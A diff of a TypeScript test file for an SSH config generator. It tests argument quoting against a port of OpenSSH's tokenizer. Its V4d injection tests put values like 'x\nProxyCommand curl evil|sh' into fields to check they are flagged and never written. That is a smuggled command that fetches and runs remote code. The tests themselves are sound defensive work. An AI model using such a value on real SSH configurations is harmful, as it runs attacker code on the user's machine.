@@ -177,6 +177,107 @@ ok(validateBlock({ ...emptyBlock(), host: "h", controlPersist: "35791395m" }).so
   ok(!cmd.includes("ServerAliveInterval") && !cmd.includes("ControlPersist"), `oversized times left out: ${cmd}`);
 }
 
+// V4c. A value with a space, quote, backslash or hash must survive ssh's own tokenizer as ONE argument.
+// argvSplit is a port of argv_split() from OpenSSH misc.c (terminate_on_comment = 1), which readconf.c
+// uses for every config line and for -o values.
+function argvSplit(line: string): string[] | null {
+  const argv: string[] = [];
+  for (let i = 0; i < line.length; i++) {
+    if (line[i] === " " || line[i] === "\t") continue;
+    if (line[i] === "#") break;
+    let quote = "";
+    let arg = "";
+    for (; i < line.length; i++) {
+      const c = line[i];
+      if (c === "\\") {
+        const n = line[i + 1];
+        if (n === "'" || n === '"' || n === "\\" || (quote === "" && n === " ")) {
+          i++;
+          arg += line[i];
+        } else {
+          arg += c;
+        }
+      } else if (quote === "" && (c === " " || c === "\t")) break;
+      else if (quote === "" && (c === '"' || c === "'")) quote = c;
+      else if (quote !== "" && c === quote) quote = "";
+      else arg += c;
+    }
+    if (i >= line.length && quote !== "") return null;
+    argv.push(arg);
+  }
+  return argv;
+}
+// A shell that only knows single quotes, as shellQuote writes them, to get what ssh would receive.
+function shellWords(command: string): string[] {
+  const words: string[] = [];
+  let cur = "";
+  let inWord = false;
+  let q = false;
+  for (let i = 0; i < command.length; i++) {
+    const c = command[i];
+    if (q) { if (c === "'") q = false; else cur += c; }
+    else if (c === "\\" && i + 1 < command.length) { cur += command[++i]; inWord = true; }
+    else if (c === "'") { q = true; inWord = true; }
+    else if (c === " ") { if (inWord) { words.push(cur); cur = ""; inWord = false; } }
+    else { cur += c; inWord = true; }
+  }
+  if (inWord) words.push(cur);
+  return words;
+}
+const awkward = [
+  "/tmp/key with space",
+  "/home/a b/.ssh/id ed25519",
+  'a"quote',
+  "it's",
+  "C:\\Users\\me\\.ssh\\id",
+  "C:\\\\server\\share\\key",
+  "back\\slash at end\\",
+  "#startswith hash",
+  "tab\there",
+  "~/.ssh/cm-%r@%h:%p",
+  "~/.ssh/id_ed25519",
+  "ünï cödé/key file",
+];
+for (const value of awkward) {
+  const hasTab = value.includes("\t");
+  const b = { ...emptyBlock(), host: "h", hostName: "h.example", identityFile: value, controlPath: value };
+  const lines = renderBlock(b).split("\n").map((l) => l.trim());
+  const identity = lines.find((l) => l.startsWith("IdentityFile "))!;
+  const cpath = lines.find((l) => l.startsWith("ControlPath "))!;
+  // A tab is a control character, so it is refused rather than written.
+  if (hasTab) {
+    eq(identity, undefined, "a value with a tab is not written as IdentityFile");
+    eq(cpath, undefined, "a value with a tab is not written as ControlPath");
+    continue;
+  }
+  eq(argvSplit(identity), ["IdentityFile", value.trim()], `IdentityFile ${JSON.stringify(value)} is one argument`);
+  eq(argvSplit(cpath), ["ControlPath", value.trim()], `ControlPath ${JSON.stringify(value)} is one argument`);
+  // The command: -i takes the path directly, -o goes through the same tokenizer as a config line.
+  const words = shellWords(sshCommand(b));
+  eq(words[words.indexOf("-i") + 1], value.trim(), `-i ${JSON.stringify(value)} reaches ssh intact`);
+  const opt = words[words.findIndex((w) => w.startsWith("ControlPath=")) ];
+  const decoded = argvSplit(opt.replace("=", " "));
+  eq(decoded, ["ControlPath", value.trim()], `-o ControlPath for ${JSON.stringify(value)} is one argument`);
+}
+eq(renderBlock({ ...emptyBlock(), host: "h", identityFile: "/tmp/key with space" }).includes('IdentityFile "/tmp/key with space"'), true, "space gets double quotes");
+eq(renderBlock({ ...emptyBlock(), host: "h", identityFile: "~/.ssh/id_ed25519" }).includes("IdentityFile ~/.ssh/id_ed25519"), true, "an ordinary path stays unquoted");
+eq(renderBlock({ ...emptyBlock(), host: "h", proxyJump: "a b" }).includes('ProxyJump "a b"'), true, "ProxyJump with a space is one argument");
+
+// V4d. A line break would end the line and start a new keyword: it is refused and flagged, never written.
+for (const [field, label] of [["identityFile", "IdentityFile"], ["controlPath", "ControlPath"], ["proxyJump", "ProxyJump"]] as const) {
+  const hostile = { ...emptyBlock(), host: "h", [field]: "x\nProxyCommand curl evil|sh" } as HostBlock;
+  ok(validateBlock(hostile).some((e) => e.field === field), `${label} with a line break is flagged`);
+  const text = renderBlock(hostile);
+  ok(!text.includes("ProxyCommand"), `${label} with a line break never writes the second keyword`);
+  ok(!sshCommand(hostile).includes("ProxyCommand"), `${label} with a line break stays out of the command`);
+}
+{
+  const hostile = { ...emptyBlock(), host: "a\nProxyCommand evil", hostName: "h.example" };
+  ok(validateBlock(hostile).some((e) => e.field === "host" && /line break/.test(e.message)), "Host with a line break is flagged");
+  ok(!renderBlock(hostile).includes("ProxyCommand"), "Host with a line break never writes the second keyword");
+  ok(renderBlock(hostile).startsWith("Host unnamed"), "Host falls back to the placeholder");
+}
+
 // V5. IdentitiesOnly emits a boolean keyword and the matching -o option.
 {
   const b: HostBlock = { ...emptyBlock(), host: "h", hostName: "x", identitiesOnly: true, identityFile: "~/.ssh/k" };
